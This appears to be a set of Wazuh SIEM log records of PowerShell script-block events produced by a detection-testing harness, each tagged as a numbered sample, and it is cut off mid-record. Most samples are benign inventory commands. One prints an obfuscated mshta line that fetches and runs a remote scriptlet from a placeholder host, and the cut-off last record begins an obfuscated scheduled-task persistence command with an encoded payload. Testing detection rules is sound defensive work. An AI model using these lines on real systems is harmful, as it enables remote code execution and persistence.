{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"470b5d33-388c-47e5-b3de-01a240faa562","scriptBlockText":"$sampleId='PST-235'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723505","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-235'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 470b5d33-388c-47e5-b3de-01a240faa562\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:23.0644175Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:23.0644175Z\",\"eventRecordID\":\"723505\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-235'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 470b5d33-388c-47e5-b3de-01a240faa562\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-235'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"470b5d33-388c-47e5-b3de-01a240faa562\"}}}","id":"1784281043.566333","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:23.761+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"ba5ab3ec-bb53-4377-b216-389c115a38a2","scriptBlockText":"$sampleId='PST-236'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723510","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-236'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: ba5ab3ec-bb53-4377-b216-389c115a38a2\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:23.8091307Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:23.8091307Z\",\"eventRecordID\":\"723510\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-236'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: ba5ab3ec-bb53-4377-b216-389c115a38a2\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-236'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"ba5ab3ec-bb53-4377-b216-389c115a38a2\"}}}","id":"1784281044.566333","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:24.823+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"93bfd346-2ff7-44c0-9cb7-0febd2843b26","scriptBlockText":"$sampleId='PST-237'; $PSVersionTable | Select-Object PSVersion, PSEdition; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723514","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-237'; $PSVersionTable | Select-Object PSVersion, PSEdition; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 93bfd346-2ff7-44c0-9cb7-0febd2843b26\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:24.1336093Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:24.1336093Z\",\"eventRecordID\":\"723514\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-237'; $PSVersionTable | Select-Object PSVersion, PSEdition; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 93bfd346-2ff7-44c0-9cb7-0febd2843b26\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-237'; $PSVersionTable | Select-Object PSVersion, PSEdition; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"93bfd346-2ff7-44c0-9cb7-0febd2843b26\"}}}","id":"1784281044.566333","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:24.865+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f9d16cf3-ee04-49e0-8dfa-9505730ad82b","scriptBlockText":"$sampleId='PST-238'; $indicator='mshta.exe jav`ascript:a=GetObject(''sc`ript:https://hta.ex`ample.inval`id/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723517","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-238'; $indicator='mshta.exe jav`ascript:a=GetObject(''sc`ript:https://hta.ex`ample.inval`id/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f9d16cf3-ee04-49e0-8dfa-9505730ad82b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:24.4608855Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:24.4608855Z\",\"eventRecordID\":\"723517\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-238'; $indicator='mshta.exe jav`ascript:a=GetObject(''sc`ript:https://hta.ex`ample.inval`id/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f9d16cf3-ee04-49e0-8dfa-9505730ad82b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-238'; $indicator='mshta.exe jav`ascript:a=GetObject(''sc`ript:https://hta.ex`ample.inval`id/a.sct'').Exec();close()'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f9d16cf3-ee04-49e0-8dfa-9505730ad82b\"}}}","id":"1784281044.566333","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:24.912+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"2a49b10b-1599-4264-9aa5-d43e731705b6","scriptBlockText":"$sampleId='PST-239'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723521","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-239'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 2a49b10b-1599-4264-9aa5-d43e731705b6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:24.8020887Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:24.8020887Z\",\"eventRecordID\":\"723521\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-239'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 2a49b10b-1599-4264-9aa5-d43e731705b6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-239'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"2a49b10b-1599-4264-9aa5-d43e731705b6\"}}}","id":"1784281044.566333","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":22,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:37:24.974+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"eb27f89b-3b4b-4baa-8c55-fd2d40c234a3","scriptBlockText":"$sampleId='PST-240'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723523","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-240'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: eb27f89b-3b4b-4baa-8c55-fd2d40c234a3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:25.1422059Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:25.1422059Z\",\"eventRecordID\":\"723523\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-240'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: eb27f89b-3b4b-4baa-8c55-fd2d40c234a3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-240'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"eb27f89b-3b4b-4baa-8c55-fd2d40c234a3\"}}}","id":"1784281046.569556","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:26.009+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"410ec2f5-f74f-49fd-a6dd-397751eb03e2","scriptBlockText":"$sampleId='PST-241'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723538","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-241'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 410ec2f5-f74f-49fd-a6dd-397751eb03e2\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:25.4722318Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:25.4722318Z\",\"eventRecordID\":\"723538\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-241'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 410ec2f5-f74f-49fd-a6dd-397751eb03e2\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-241'; Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"410ec2f5-f74f-49fd-a6dd-397751eb03e2\"}}}","id":"1784281046.569556","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:26.066+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c9fba75e-4259-4730-af86-b79b7d78ac7c","scriptBlockText":"$sampleId='PST-242'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723546","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-242'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c9fba75e-4259-4730-af86-b79b7d78ac7c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:26.1261958Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:26.1261958Z\",\"eventRecordID\":\"723546\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-242'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c9fba75e-4259-4730-af86-b79b7d78ac7c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-242'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c9fba75e-4259-4730-af86-b79b7d78ac7c\"}}}","id":"1784281047.569556","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:27.104+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1a75b3e1-1ac3-4abd-b3e5-767d90e22a09","scriptBlockText":"$sampleId='PST-243'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723549","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-243'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1a75b3e1-1ac3-4abd-b3e5-767d90e22a09\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:26.6459959Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:26.6459959Z\",\"eventRecordID\":\"723549\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-243'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1a75b3e1-1ac3-4abd-b3e5-767d90e22a09\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-243'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1a75b3e1-1ac3-4abd-b3e5-767d90e22a09\"}}}","id":"1784281047.569556","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:27.143+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"6d437857-fb91-4810-8f9d-0456cfc02384","scriptBlockText":"$sampleId='PST-244'; [xml]$xml = '&lt;inventory&gt;&lt;host name=\\\"ws-01\\\"&gt;&lt;state&gt;ok&lt;/state&gt;&lt;/host&gt;&lt;/inventory&gt;'; $xml.inventory.host.state; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723563","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-244'; [xml]$xml = '<inventory><host name=\"ws-01\"><state>ok</state></host></inventory>'; $xml.inventory.host.state; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 6d437857-fb91-4810-8f9d-0456cfc02384\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:26.9848542Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:26.9848542Z\",\"eventRecordID\":\"723563\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-244'; [xml]$xml = '<inventory><host name=\\\"ws-01\\\"><state>ok</state></host></inventory>'; $xml.inventory.host.state; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 6d437857-fb91-4810-8f9d-0456cfc02384\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-244'; [xml]$xml = '&lt;inventory&gt;&lt;host name=\\\\\\\"ws-01\\\\\\\"&gt;&lt;state&gt;ok&lt;/state&gt;&lt;/host&gt;&lt;/inventory&gt;'; $xml.inventory.host.state; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"6d437857-fb91-4810-8f9d-0456cfc02384\"}}}","id":"1784281047.569556","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:27.348+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a5895818-95ba-4d72-95e8-9a193d1f5c30","scriptBlockText":"$sampleId='PST-245'; $parts=@('regIsT`ER-SChEdu','LEDTaSK -ta`SKNAme ''','UPDaTECHeCk'' -act`I','oN (NEw-scHedUleDTaSKa','C`T`IOn -eX`eCuTe',' ''pOwe`rsHELl.exe'' -','ARg`uMeNT ''-nO`PrOFILE ','-enCOdeD`CO`mManD vWB','`YaGK`aDABlAC0atWB1','AHQa`CaB1AHQAiAa','naFqaSAbFaf`mA`SqBTAc0aS','qBoa`EuAuGbuaC`cA''',')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723565","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-245'; $parts=@('regIsT`ER-SChEdu','LEDTaSK -ta`SKNAme ''','UPDaTECHeCk'' -act`I','oN (NEw-scHedUleDTaSKa','C`T`IOn -eX`eCuTe',' 